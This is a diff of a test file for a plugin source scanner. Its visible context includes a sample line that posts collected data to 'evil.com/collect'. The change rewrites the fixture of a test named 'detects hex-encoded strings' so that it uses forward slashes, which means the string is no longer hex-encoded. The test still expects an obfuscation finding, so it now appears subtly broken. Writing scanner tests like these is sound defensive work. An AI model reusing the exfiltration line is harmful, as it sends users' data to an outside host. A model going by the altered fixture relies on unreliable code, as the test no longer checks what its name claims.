@@ -104,7 +104,7 @@ fetch("https://evil.com/collect", { method: "post", body: data });
 
   it("detects hex-encoded strings (obfuscation)", () => {
     const source = `
-const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
+const payload = "/x72/x65/x71/x75/x69/x72/x65";
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(findings.some((f) => f.ruleId === "obfuscated-code" && f.severity === "warn")).toBe(
